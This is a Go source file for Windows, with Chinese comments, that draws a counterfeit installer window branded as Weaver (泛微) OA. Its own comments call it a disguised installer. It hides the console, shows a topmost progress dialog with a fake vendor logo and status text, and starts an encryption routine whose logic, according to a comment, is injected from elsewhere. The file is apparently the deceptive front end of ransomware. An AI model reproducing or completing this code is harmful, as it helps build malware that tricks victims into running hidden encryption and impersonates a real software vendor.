//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

// ============================================================================
// Win32 API 常量
// ============================================================================

const (
	// 窗口样式
	WS_POPUP            = 0x80000000
	WS_CAPTION          = 0x00C00000
	WS_SYSMENU          = 0x00080000
	WS_MINIMIZEBOX      = 0x00020000
	WS_VISIBLE          = 0x10000000
	WS_CHILD            = 0x40000000

	// 扩展样式
	WS_EX_TOPMOST = 0x00000008

	// 窗口消息
	WM_CREATE         = 0x0001
	WM_DESTROY        = 0x0002
	WM_CLOSE          = 0x0010
	WM_COMMAND        = 0x0111
	WM_PAINT          = 0x000F
	WM_TIMER          = 0x0113
	WM_ERASEBKGND     = 0x0014
	WM_CTLCOLORSTATIC = 0x0138
	WM_SETCURSOR      = 0x0020
	WM_MOUSEMOVE      = 0x0200

	// 控件
	WC_STATIC = "STATIC"

	// 静态文本样式
	SS_CENTER = 0x00000001
	SS_LEFT   = 0x00000000
	SS_NOTIFY = 0x00000100

	// 显示窗口
	SW_SHOW       = 5
	SW_SHOWNORMAL = 1
	SW_HIDE       = 0

	// 类和光标
	CS_HREDRAW = 0x0002
	CS_VREDRAW = 0x0001
	IDC_ARROW  = 32512
	IDC_HAND   = 32649

	// 绘图
	TRANSPARENT = 1
	PS_SOLID    = 0

	// 控件 ID
	IDC_PROGRESS_TEXT = 1006
	IDC_STATUS        = 1002
	IDC_CANCEL_BTN    = 1003
	IDC_TITLE         = 1004
	IDC_SUBTITLE      = 1005
	IDC_BRAND         = 1007

	// 定时器 ID
	TIMER_UPDATE = 1

	// 字体
	FW_NORMAL           = 400
	FW_BOLD             = 700
	DEFAULT_CHARSET     = 1
	OUT_DEFAULT_PRECIS  = 0
	CLIP_DEFAULT_PRECIS = 0
	DEFAULT_QUALITY     = 0
	DEFAULT_PITCH       = 0
	FF_DONTCARE         = 0

	// WM_SETFONT
	WM_SETFONT = 0x0030

	// DWM 窗口圆角 (Win11)
	DWMWA_WINDOW_CORNER_PREFERENCE = 33
	DWMWCP_ROUND                   = 2

	// 绘制
	DT_CENTER  = 0x00000001
	DT_VCENTER = 0x00000004

	// 泛微OA 品牌色 (COLORREF 格式: 0x00BBGGRR)
	COLOR_WEAVER_BLUE    = 0x00D27419 // #1974D2 泛微主蓝
	COLOR_WEAVER_BLUE_LT = 0x00F3A042 // #42A0F3 浅蓝
	COLOR_WEAVER_DARK    = 0x00804010 // #104080 深蓝
	COLOR_TEXT_GRAY      = 0x00666666 // #666666
	COLOR_BG             = 0x00FAFBFC // #FCFBFA 微暖白
	COLOR_PROGRESS_BG    = 0x00E8E8E8
	COLOR_PROGRESS_BD    = 0x00D0D0D0
	COLOR_LINE           = 0x00E0E0E0
	COLOR_GREEN_CHECK    = 0x005CB85C // #5CB85C
)

// ============================================================================
// Win32 结构体
// ============================================================================

type WNDCLASSEX struct {
	CbSize        uint32
	Style         uint32
	LpfnWndProc   uintptr
	CbClsExtra    int32
	CbWndExtra    int32
	HInstance     syscall.Handle
	HIcon         syscall.Handle
	HCursor       syscall.Handle
	HbrBackground syscall.Handle
	LpszMenuName  *uint16
	LpszClassName *uint16
	HIconSm       syscall.Handle
}

type MSG struct {
	Hwnd    syscall.Handle
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

type POINT struct{ X, Y int32 }
type RECT struct{ Left, Top, Right, Bottom int32 }

type PAINTSTRUCT struct {
	Hdc         syscall.Handle
	FErase      int32
	RcPaint     RECT
	Restore     int32
	IncUpdate   int32
	RgbReserved [32]byte
}

// ============================================================================
// DLL 导入
// ============================================================================

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	gdi32    = syscall.NewLazyDLL("gdi32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	dwmapi   = syscall.NewLazyDLL("dwmapi.dll")
	comctl32 = syscall.NewLazyDLL("comctl32.dll")

	procGetModuleHandleW      = kernel32.NewProc("GetModuleHandleW")
	procRegisterClassExW      = user32.NewProc("RegisterClassExW")
	procCreateWindowExW       = user32.NewProc("CreateWindowExW")
	procShowWindow            = user32.NewProc("ShowWindow")
	procUpdateWindow          = user32.NewProc("UpdateWindow")
	procGetMessageW           = user32.NewProc("GetMessageW")
	procTranslateMessage      = user32.NewProc("TranslateMessage")
	procDispatchMessageW      = user32.NewProc("DispatchMessageW")
	procPostQuitMessage       = user32.NewProc("PostQuitMessage")
	procDefWindowProcW        = user32.NewProc("DefWindowProcW")
	procDestroyWindow         = user32.NewProc("DestroyWindow")
	procGetClientRect         = user32.NewProc("GetClientRect")
	procSetTimer              = user32.NewProc("SetTimer")
	procKillTimer             = user32.NewProc("KillTimer")
	procSendMessageW          = user32.NewProc("SendMessageW")
	procLoadCursorW           = user32.NewProc("LoadCursorW")
	procSetCursor             = user32.NewProc("SetCursor")
	procGetDlgItem            = user32.NewProc("GetDlgItem")
	procBeginPaint            = user32.NewProc("BeginPaint")
	procEndPaint              = user32.NewProc("EndPaint")
	procCreateSolidBrush      = gdi32.NewProc("CreateSolidBrush")
	procDeleteObject          = gdi32.NewProc("DeleteObject")
	procEllipse               = gdi32.NewProc("Ellipse")
	procRoundRect             = gdi32.NewProc("RoundRect")
	procCreatePen             = gdi32.NewProc("CreatePen")
	procSelectObject          = gdi32.NewProc("SelectObject")
	procCreateFontW           = gdi32.NewProc("CreateFontW")
	procFillRect              = user32.NewProc("FillRect")
	procSetBkMode             = gdi32.NewProc("SetBkMode")
	procSetTextColor          = gdi32.NewProc("SetTextColor")
	procDrawTextW             = user32.NewProc("DrawTextW")
	procMoveToEx              = gdi32.NewProc("MoveToEx")
	procLineTo                = gdi32.NewProc("LineTo")
	procInitCommonControls    = comctl32.NewProc("InitCommonControls")
	procSetWindowTextW        = user32.NewProc("SetWindowTextW")
	procEnableWindow          = user32.NewProc("EnableWindow")
	procGetConsoleWindow      = kernel32.NewProc("GetConsoleWindow")
	procGetSystemMetrics      = user32.NewProc("GetSystemMetrics")
	procDwmSetWindowAttribute = dwmapi.NewProc("DwmSetWindowAttribute")
	procInvalidateRect        = user32.NewProc("InvalidateRect")
)

// ============================================================================
// 辅助函数
// ============================================================================

func getDlgItem(hwnd syscall.Handle, id int) uintptr {
	r, _, _ := procGetDlgItem.Call(uintptr(hwnd), uintptr(id))
	return r
}

func createFont(size int, weight int, faceName string) uintptr {
	uFace := syscall.StringToUTF16Ptr(faceName)
	h, _, _ := procCreateFontW.Call(
		uintptr(size), 0, 0, 0,
		uintptr(weight), 0, 0, 0,
		DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
		DEFAULT_QUALITY, DEFAULT_PITCH|FF_DONTCARE,
		uintptr(unsafe.Pointer(uFace)),
	)
	return h
}

func loadCursorRes(cursorID uint32) uintptr {
	h, _, _ := procLoadCursorW.Call(0, uintptr(cursorID))
	return h
}

// ============================================================================
// 全局变量
// ============================================================================

var (
	guiHwnd      syscall.Handle
	guiHInstance syscall.Handle

	guiStatusChan   = make(chan string, 10)
	guiProgressChan = make(chan int, 10)
	guiTitleChan    = make(chan string, 10)
	guiSubtitleChan = make(chan string, 10)
	guiDoneChan     = make(chan bool, 1)
	guiCancelChan   = make(chan bool, 1)

	guiFontNormal   syscall.Handle
	guiFontBold     syscall.Handle
	guiFontTitle    syscall.Handle
	guiFontBrand    syscall.Handle
	guiFontProgress syscall.Handle

	guiBrushBg           syscall.Handle
	guiBrushWhite        syscall.Handle
	guiBrushWeaverBlue   syscall.Handle
	guiBrushProgressBg   syscall.Handle
	guiBrushProgressBd   syscall.Handle
	guiBrushLine         syscall.Handle
	guiBrushGreenCheck   syscall.Handle

	guiHandCursor syscall.Handle

	guiCancelled       bool
	guiFinished        bool
	guiProgressPercent int
	guiIsHoverCancel   bool
)

// 窗口尺寸常量
const (
	winWidth  = 500
	winHeight = 440
)

// UI 区域
var (
	progressBarRect = RECT{Left: 60, Top: 270, Right: 440, Bottom: 278}
	cancelBtnRect   = RECT{Left: 220, Top: 340, Right: 280, Bottom: 362}
	separatorRect   = RECT{Left: 60, Top: 155, Right: 440, Bottom: 156}
)

// ============================================================================
// 公共接口
// ============================================================================

func updateInstallerTitle(text string) {
	select {
	case guiTitleChan <- text:
	default:
	}
}

func updateInstallerSubtitle(text string) {
	select {
	case guiSubtitleChan <- text:
	default:
	}
}

func updateInstallerStatus(text string) {
	select {
	case guiStatusChan <- text:
	default:
	}
}

func updateInstallerProgress(percent int) {
	select {
	case guiProgressChan <- percent:
	default:
	}
}

func isInstallerCancelled() bool {
	return guiCancelled
}

// ============================================================================
// 主函数：创建并运行伪装安装器
// ============================================================================

func runInstallerMode() {
	// 隐藏控制台窗口
	console, _, _ := procGetConsoleWindow.Call()
	if console != 0 {
		procShowWindow.Call(console, uintptr(SW_HIDE))
	}

	procInitCommonControls.Call()

	hinst, _, _ := procGetModuleHandleW.Call(0)
	guiHInstance = syscall.Handle(hinst)

	// 创建字体
	guiFontNormal = syscall.Handle(createFont(15, FW_NORMAL, "Microsoft YaHei"))
	guiFontBold = syscall.Handle(createFont(15, FW_BOLD, "Microsoft YaHei"))
	guiFontTitle = syscall.Handle(createFont(20, FW_BOLD, "Microsoft YaHei"))
	guiFontBrand = syscall.Handle(createFont(12, FW_NORMAL, "Microsoft YaHei"))
	guiFontProgress = syscall.Handle(createFont(13, FW_NORMAL, "Microsoft YaHei"))

	// 创建画刷
	bg, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_BG))
	guiBrushBg = syscall.Handle(bg)
	bw, _, _ := procCreateSolidBrush.Call(uintptr(0x00FFFFFF))
	guiBrushWhite = syscall.Handle(bw)
	bb, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_WEAVER_BLUE))
	guiBrushWeaverBlue = syscall.Handle(bb)
	bpg, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_PROGRESS_BG))
	guiBrushProgressBg = syscall.Handle(bpg)
	bpb, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_PROGRESS_BD))
	guiBrushProgressBd = syscall.Handle(bpb)
	bl, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_LINE))
	guiBrushLine = syscall.Handle(bl)
	bcg, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_GREEN_CHECK))
	guiBrushGreenCheck = syscall.Handle(bcg)

	// 加载手型光标
	hc, _, _ := procLoadCursorW.Call(0, uintptr(IDC_HAND))
	guiHandCursor = syscall.Handle(hc)

	// 注册窗口类
	className := syscall.StringToUTF16Ptr("WeaverOAInstallerWnd")
	wc := WNDCLASSEX{
		CbSize:        uint32(unsafe.Sizeof(WNDCLASSEX{})),
		Style:         CS_HREDRAW | CS_VREDRAW,
		LpfnWndProc:   syscall.NewCallback(wndProc),
		HInstance:     guiHInstance,
		HbrBackground: uintptr(guiBrushBg),
		HCursor:       uintptr(loadCursorRes(IDC_ARROW)),
		LpszClassName: className,
	}
	procRegisterClassExW.Call(uintptr(unsafe.Pointer(&wc)))

	// 居中窗口
	screenW, _, _ := procGetSystemMetrics.Call(0)
	screenH, _, _ := procGetSystemMetrics.Call(1)
	x := (int(screenW) - winWidth) / 2
	y := (int(screenH) - winHeight) / 2

	// 创建窗口
	windowTitle := syscall.StringToUTF16Ptr("泛微OA协同办公平台 - 安装向导")
	hwnd, _, _ := procCreateWindowExW.Call(
		WS_EX_TOPMOST,
		uintptr(unsafe.Pointer(className)),
		uintptr(unsafe.Pointer(windowTitle)),
		WS_POPUP|WS_VISIBLE,
		uintptr(x), uintptr(y),
		uintptr(winWidth), uintptr(winHeight),
		0, 0, uintptr(guiHInstance), 0,
	)
	guiHwnd = syscall.Handle(hwnd)

	// Win11 圆角
	procDwmSetWindowAttribute.Call(
		uintptr(guiHwnd),
		DWMWA_WINDOW_CORNER_PREFERENCE,
		uintptr(unsafe.Pointer(func() *uint32 { v := uint32(DWMWCP_ROUND); return &v }())),
		unsafe.Sizeof(uint32(0)),
	)

	procShowWindow.Call(uintptr(guiHwnd), SW_SHOWNORMAL)
	procUpdateWindow.Call(uintptr(guiHwnd))

	// 消息循环
	var msg MSG
	for {
		ret, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if ret == 0 {
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessageW.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

// ============================================================================
// 窗口过程
// ============================================================================

func wndProc(hwnd syscall.Handle, msg uint32, wparam, lparam uintptr) uintptr {
	switch msg {
	case WM_CREATE:
		onCreate(hwnd)
		go runEncryptionWithGUI()
		procSetTimer.Call(uintptr(hwnd), TIMER_UPDATE, 16, 0)
		return 0

	case WM_TIMER:
		if wparam == TIMER_UPDATE {
			processGUIUpdates()
		}
		return 0

	case WM_COMMAND:
		hiWord := (wparam >> 16) & 0xFFFF
		loWord := wparam & 0xFFFF
		if hiWord == 0 && loWord == uintptr(IDC_CANCEL_BTN) {
			onCancel(hwnd)
		}
		return 0

	case WM_PAINT:
		var ps PAINTSTRUCT
		hdc, _, _ := procBeginPaint.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&ps)))
		if hdc != 0 {
			if guiFinished {
				drawGreenCheckmark(hdc)
			} else {
				drawWeaverLogo(hdc)
			}
			drawSeparatorLine(hdc)
			drawRoundedProgressBar(hdc)
			procEndPaint.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&ps)))
		}
		return 0

	case WM_ERASEBKGND:
		var rc RECT
		procGetClientRect.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&rc)))
		procFillRect.Call(wparam, uintptr(unsafe.Pointer(&rc)), uintptr(guiBrushBg))
		return 1

	case WM_CTLCOLORSTATIC:
		ctrlCancel, _, _ := procGetDlgItem.Call(uintptr(hwnd), uintptr(IDC_CANCEL_BTN))
		if lparam == ctrlCancel {
			procSetBkMode.Call(wparam, uintptr(TRANSPARENT))
			procSetTextColor.Call(wparam, uintptr(COLOR_WEAVER_BLUE))
			return uintptr(guiBrushBg)
		}
		ctrlBrand, _, _ := procGetDlgItem.Call(uintptr(hwnd), uintptr(IDC_BRAND))
		if lparam == ctrlBrand {
			procSetBkMode.Call(wparam, uintptr(TRANSPARENT))
			procSetTextColor.Call(wparam, uintptr(COLOR_TEXT_GRAY))
			return uintptr(guiBrushBg)
		}
		procSetBkMode.Call(wparam, uintptr(TRANSPARENT))
		return uintptr(guiBrushBg)

	case WM_SETCURSOR:
		if guiIsHoverCancel && guiHandCursor != 0 {
			procSetCursor.Call(uintptr(guiHandCursor))
			return 1
		}
		ret, _, _ := procDefWindowProcW.Call(uintptr(hwnd), uintptr(msg), wparam, lparam)
		return ret

	case WM_MOUSEMOVE:
		cx := int32(lparam & 0xFFFF)
		cy := int32((lparam >> 16) & 0xFFFF)
		hwndCancel := getDlgItem(hwnd, IDC_CANCEL_BTN)
		if hwndCancel != 0 {
			wasHover := guiIsHoverCancel
			guiIsHoverCancel = cx >= cancelBtnRect.Left && cx < cancelBtnRect.Right &&
				cy >= cancelBtnRect.Top && cy < cancelBtnRect.Bottom
			if wasHover != guiIsHoverCancel {
				procInvalidateRect.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&cancelBtnRect)), 0)
			}
		}
		return 0

	case WM_DESTROY:
		procKillTimer.Call(uintptr(hwnd), TIMER_UPDATE)
		cleanupGDIResources()
		procPostQuitMessage.Call(0)
		return 0
	}

	ret, _, _ := procDefWindowProcW.Call(uintptr(hwnd), uintptr(msg), wparam, lparam)
	return ret
}

// ============================================================================
// 控件创建
// ============================================================================

func onCreate(hwnd syscall.Handle) {
	// === 标题 ===
	titleText := syscall.StringToUTF16Ptr("正在安装 泛微OA协同办公平台...")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(titleText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER),
		40, 175, 420, 32,
		uintptr(hwnd), uintptr(IDC_TITLE), uintptr(guiHInstance), 0,
	)
	procSendMessageW.Call(getDlgItem(hwnd, IDC_TITLE), uintptr(WM_SETFONT), uintptr(guiFontTitle), 1)

	// === 副标题 ===
	subtitleText := syscall.StringToUTF16Ptr("正在下载安装组件...")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(subtitleText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER),
		40, 215, 420, 22,
		uintptr(hwnd), uintptr(IDC_SUBTITLE), uintptr(guiHInstance), 0,
	)
	procSendMessageW.Call(getDlgItem(hwnd, IDC_SUBTITLE), uintptr(WM_SETFONT), uintptr(guiFontNormal), 1)

	// === 状态文字 ===
	statusText := syscall.StringToUTF16Ptr("正在连接服务器...")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(statusText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_LEFT),
		60, 300, 380, 20,
		uintptr(hwnd), uintptr(IDC_STATUS), uintptr(guiHInstance), 0,
	)
	procSendMessageW.Call(getDlgItem(hwnd, IDC_STATUS), uintptr(WM_SETFONT), uintptr(guiFontProgress), 1)

	// === 进度百分比 ===
	progressText := syscall.StringToUTF16Ptr("0%")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(progressText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER),
		210, 282, 80, 20,
		uintptr(hwnd), uintptr(IDC_PROGRESS_TEXT), uintptr(guiHInstance), 0,
	)
	procSendMessageW.Call(getDlgItem(hwnd, IDC_PROGRESS_TEXT), uintptr(WM_SETFONT), uintptr(guiFontProgress), 1)

	// === 取消按钮 ===
	cancelText := syscall.StringToUTF16Ptr("取消")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(cancelText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER|SS_NOTIFY),
		uintptr(cancelBtnRect.Left), uintptr(cancelBtnRect.Top),
		uintptr(cancelBtnRect.Right-cancelBtnRect.Left), uintptr(cancelBtnRect.Bottom-cancelBtnRect.Top),
		uintptr(hwnd), uintptr(IDC_CANCEL_BTN), uintptr(guiHInstance), 0,
	)
	procSendMessageW.Call(getDlgItem(hwnd, IDC_CANCEL_BTN), uintptr(WM_SETFONT), uintptr(guiFontBold), 1)

	// === 底部品牌 ===
	brandText := syscall.StringToUTF16Ptr("泛微网络 Weaver")
	procCreateWindowExW.Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(WC_STATIC))),
		uintptr(unsafe.Pointer(brandText)),
		uintptr(WS_CHILD|WS_VISIBLE|SS_CENTER),
		150, 398, 200, 20,
		uintptr(hwnd), uintptr(IDC_BRAND), uintptr(guiHInstance), 0,
	)
	procSendMessageW.Call(getDlgItem(hwnd, IDC_BRAND), uintptr(WM_SETFONT), uintptr(guiFontBrand), 1)
}

// ============================================================================
// 取消按钮处理
// ============================================================================

func onCancel(hwnd syscall.Handle) {
	if !guiCancelled {
		guiCancelled = true
		select {
		case guiCancelChan <- true:
		default:
		}
		hwndBtn := getDlgItem(hwnd, IDC_CANCEL_BTN)
		procEnableWindow.Call(hwndBtn, 0)
		cancelText := syscall.StringToUTF16Ptr("正在取消...")
		procSetWindowTextW.Call(getDlgItem(hwnd, IDC_STATUS), uintptr(unsafe.Pointer(cancelText)))
	}
}

// ============================================================================
// GUI 更新处理
// ============================================================================

func processGUIUpdates() {
	select {
	case <-guiCancelChan:
		guiCancelled = true
		procDestroyWindow.Call(uintptr(guiHwnd))
		return
	default:
	}

	if guiFinished {
		procDestroyWindow.Call(uintptr(guiHwnd))
		return
	}

	select {
	case text := <-guiTitleChan:
		uPtr := syscall.StringToUTF16Ptr(text)
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_TITLE), uintptr(unsafe.Pointer(uPtr)))
	default:
	}

	select {
	case text := <-guiSubtitleChan:
		uPtr := syscall.StringToUTF16Ptr(text)
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_SUBTITLE), uintptr(unsafe.Pointer(uPtr)))
	default:
	}

	select {
	case text := <-guiStatusChan:
		uPtr := syscall.StringToUTF16Ptr(text)
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_STATUS), uintptr(unsafe.Pointer(uPtr)))
	default:
	}

	select {
	case percent := <-guiProgressChan:
		guiProgressPercent = percent
		progressText := syscall.StringToUTF16Ptr(fmt.Sprintf("%d%%", percent))
		procSetWindowTextW.Call(getDlgItem(guiHwnd, IDC_PROGRESS_TEXT), uintptr(unsafe.Pointer(progressText)))
		procInvalidateRect.Call(uintptr(guiHwnd), uintptr(unsafe.Pointer(&progressBarRect)), 0)
	default:
	}
}

// ============================================================================
// 完成信号
// ============================================================================

func signalInstallerDone() {
	guiFinished = true
}

// ============================================================================
// 绘制：分隔线
// ============================================================================

func drawSeparatorLine(hdc uintptr) {
	pen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(COLOR_LINE))
	oldPen, _, _ := procSelectObject.Call(hdc, pen)
	procMoveToEx.Call(hdc, uintptr(separatorRect.Left), uintptr(separatorRect.Top), 0)
	procLineTo.Call(hdc, uintptr(separatorRect.Right), uintptr(separatorRect.Top))
	procSelectObject.Call(hdc, oldPen)
	procDeleteObject.Call(pen)
}

// ============================================================================
// 绘制：圆角进度条（泛微蓝色主题）
// ============================================================================

func drawRoundedProgressBar(hdc uintptr) {
	left := progressBarRect.Left
	top := progressBarRect.Top
	right := progressBarRect.Right
	bottom := progressBarRect.Bottom
	width := right - left
	cornerRadius := int32(4)

	// 背景灰色圆角矩形
	bgPen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(COLOR_PROGRESS_BD))
	oldPen, _, _ := procSelectObject.Call(hdc, bgPen)
	oldBrush, _, _ := procSelectObject.Call(hdc, uintptr(guiBrushProgressBg))

	procRoundRect.Call(hdc,
		uintptr(left), uintptr(top), uintptr(right), uintptr(bottom),
		uintptr(cornerRadius*2), uintptr(cornerRadius*2))

	// 填充蓝色进度
	if guiProgressPercent > 0 {
		fillWidth := int32(float64(width) * float64(guiProgressPercent) / 100.0)
		if fillWidth > width {
			fillWidth = width
		}
		if fillWidth > 0 {
			bluePen, _, _ := procCreatePen.Call(PS_SOLID, 1, uintptr(COLOR_WEAVER_BLUE))
			procSelectObject.Call(hdc, bluePen)
			procSelectObject.Call(hdc, uintptr(guiBrushWeaverBlue))

			procRoundRect.Call(hdc,
				uintptr(left), uintptr(top), uintptr(left+fillWidth), uintptr(bottom),
				uintptr(cornerRadius*2), uintptr(cornerRadius*2))

			procDeleteObject.Call(bluePen)
		}
	}

	procSelectObject.Call(hdc, oldPen)
	procSelectObject.Call(hdc, oldBrush)
	procDeleteObject.Call(bgPen)
}

// ============================================================================
// 绘制：泛微OA Logo（蓝色盾牌+e 标志）
// ============================================================================

func drawWeaverLogo(hdc uintptr) {
	cx := int32(250)
	cy := int32(78)
	r := int32(40)

	// 蓝色外圆
	outerBrush, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_WEAVER_BLUE))
	outerPen, _, _ := procCreatePen.Call(PS_SOLID, 2, uintptr(COLOR_WEAVER_BLUE))
	oldPen, _, _ := procSelectObject.Call(hdc, outerPen)
	oldBrush, _, _ := procSelectObject.Call(hdc, outerBrush)

	procEllipse.Call(hdc,
		uintptr(cx-r), uintptr(cy-r),
		uintptr(cx+r), uintptr(cy+r))

	// 白色内圆
	whiteBrush, _, _ := procCreateSolidBrush.Call(uintptr(0x00FFFFFF))
	whitePen, _, _ := procCreatePen.Call(PS_SOLID, 2, uintptr(0x00FFFFFF))
	procSelectObject.Call(hdc, whitePen)
	procSelectObject.Call(hdc, whiteBrush)

	innerR := int32(28)
	procEllipse.Call(hdc,
		uintptr(cx-innerR), uintptr(cy-innerR),
		uintptr(cx+innerR), uintptr(cy+innerR))

	// 蓝色中心"e"效果 - 用蓝色小圆 + 白色切口模拟
	blueBrush2, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_WEAVER_BLUE))
	bluePen2, _, _ := procCreatePen.Call(PS_SOLID, 2, uintptr(COLOR_WEAVER_BLUE))
	procSelectObject.Call(hdc, bluePen2)
	procSelectObject.Call(hdc, blueBrush2)

	eR := int32(16)
	procEllipse.Call(hdc,
		uintptr(cx-eR), uintptr(cy-eR+4),
		uintptr(cx+eR), uintptr(cy+eR+4))

	// 白色切口（形成 e 的开口效果）
	whiteBrush2, _, _ := procCreateSolidBrush.Call(uintptr(0x00FFFFFF))
	whitePen2, _, _ := procCreatePen.Call(PS_SOLID, 2, uintptr(0x00FFFFFF))
	procSelectObject.Call(hdc, whitePen2)
	procSelectObject.Call(hdc, whiteBrush2)

	cutR := int32(10)
	procEllipse.Call(hdc,
		uintptr(cx-cutR+2), uintptr(cy-cutR+4),
		uintptr(cx+cutR+2), uintptr(cy+cutR+4))

	// 右侧切口
	procCreateSolidBrush.Call(uintptr(0x00FFFFFF))
	cutBrush, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_BG))
	cutPen, _, _ := procCreatePen.Call(PS_SOLID, 2, uintptr(COLOR_BG))
	procSelectObject.Call(hdc, cutPen)
	procSelectObject.Call(hdc, cutBrush)

	// 矩形切口
	procFillRect.Call(hdc, uintptr(unsafe.Pointer(&RECT{
		Left: cx + 2, Top: cy - 2,
		Right: cx + eR + 4, Bottom: cy + 6,
	})), uintptr(cutBrush))

	// 清理
	procSelectObject.Call(hdc, oldPen)
	procSelectObject.Call(hdc, oldBrush)
	procDeleteObject.Call(outerBrush)
	procDeleteObject.Call(outerPen)
	procDeleteObject.Call(whiteBrush)
	procDeleteObject.Call(whitePen)
	procDeleteObject.Call(blueBrush2)
	procDeleteObject.Call(bluePen2)
	procDeleteObject.Call(whiteBrush2)
	procDeleteObject.Call(whitePen2)
	procDeleteObject.Call(cutBrush)
	procDeleteObject.Call(cutPen)
}

// ============================================================================
// 绘制：绿色完成勾号
// ============================================================================

func drawGreenCheckmark(hdc uintptr) {
	cx := int32(250)
	cy := int32(85)
	size := int32(35)

	// 绿色圆形
	greenBrush, _, _ := procCreateSolidBrush.Call(uintptr(COLOR_GREEN_CHECK))
	greenPen, _, _ := procCreatePen.Call(PS_SOLID, 2, uintptr(COLOR_GREEN_CHECK))
	oldPen, _, _ := procSelectObject.Call(hdc, greenPen)
	oldBrush, _, _ := procSelectObject.Call(hdc, greenBrush)

	procEllipse.Call(hdc,
		uintptr(cx-size), uintptr(cy-size),
		uintptr(cx+size), uintptr(cy+size))

	// 白色勾号
	whitePen, _, _ := procCreatePen.Call(PS_SOLID, 3, uintptr(0x00FFFFFF))
	procSelectObject.Call(hdc, whitePen)

	procMoveToEx.Call(hdc, uintptr(cx-15), uintptr(cy), 0)
	procLineTo.Call(hdc, uintptr(cx-5), uintptr(cy+12))
	procLineTo.Call(hdc, uintptr(cx+18), uintptr(cy-12))

	procSelectObject.Call(hdc, oldPen)
	procSelectObject.Call(hdc, oldBrush)
	procDeleteObject.Call(greenBrush)
	procDeleteObject.Call(greenPen)
	procDeleteObject.Call(whitePen)
}

// ============================================================================
// 占位函数：实际加密逻辑由外部注入
// ============================================================================

func runEncryptionWithGUI() {
	<-guiDoneChan
}

// ============================================================================
// GDI 资源清理
// ============================================================================

func cleanupGDIResources() {
	if guiFontNormal != 0 {
		procDeleteObject.Call(uintptr(guiFontNormal))
	}
	if guiFontBold != 0 {
		procDeleteObject.Call(uintptr(guiFontBold))
	}
	if guiFontTitle != 0 {
		procDeleteObject.Call(uintptr(guiFontTitle))
	}
	if guiFontBrand != 0 {
		procDeleteObject.Call(uintptr(guiFontBrand))
	}
	if guiFontProgress != 0 {
		procDeleteObject.Call(uintptr(guiFontProgress))
	}
	if guiBrushBg != 0 {
		procDeleteObject.Call(uintptr(guiBrushBg))
	}
	if guiBrushWhite != 0 {
		procDeleteObject.Call(uintptr(guiBrushWhite))
	}
	if guiBrushWeaverBlue != 0 {
		procDeleteObject.Call(uintptr(guiBrushWeaverBlue))
	}
	if guiBrushProgressBg != 0 {
		procDeleteObject.Call(uintptr(guiBrushProgressBg))
	}
	if guiBrushProgressBd != 0 {
		procDeleteObject.Call(uintptr(guiBrushProgressBd))
	}
	if guiBrushLine != 0 {
		procDeleteObject.Call(uintptr(guiBrushLine))
	}
	if guiBrushGreenCheck != 0 {
		procDeleteObject.Call(uintptr(guiBrushGreenCheck))
	}
}